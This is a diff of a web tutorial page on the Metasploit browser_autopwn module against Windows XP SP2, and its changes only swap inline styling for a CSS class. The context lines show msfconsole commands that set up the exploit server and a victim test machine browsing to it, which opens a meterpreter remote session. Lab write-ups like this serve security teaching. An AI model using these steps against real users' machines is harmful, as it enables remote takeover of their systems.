@@ -5,7 +5,7 @@ Metasploit Browser Autopwn – Windows XP SP2
 ##Step 1 – Starting the Browser Autopwn Server
 Run msfconsole, load the browser_autopwn module and set all required options.<br>
 <code>
-<div style="background-color: black; color: white; padding: 20px;">
+<div class="code">
 <font color="silver">root@kali:~$</font> <b>msfconsole</b><br>
 <font color="silver">msf ></font> <b>use auxiliary/server/browser_autopwn</b><br>
 <font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set LHOST 192.168.1.12</b><br>
@@ -22,7 +22,7 @@ The Browser Autopwn Server is now running and waiting for victims to browse to t
 On your Windows XP test machine (victim), browse to http://192.168.1.12.<br>
 This will trigger the browser_autopwn module to serve the appropriate exploit and launch a meterpreter session.<br>
 <code>
-<div style="background-color: black; color: white; padding: 20px;">
+<div class="code">
 <font color="silver">[*] Meterpreter session 1 opened (192.168.1.12:7777 -> </font><br>
 <font color="silver">192.168.1.13:1045) at 2015-07-25 05:08:06 -0400</font><br>
 <font color="silver">...</font><br>
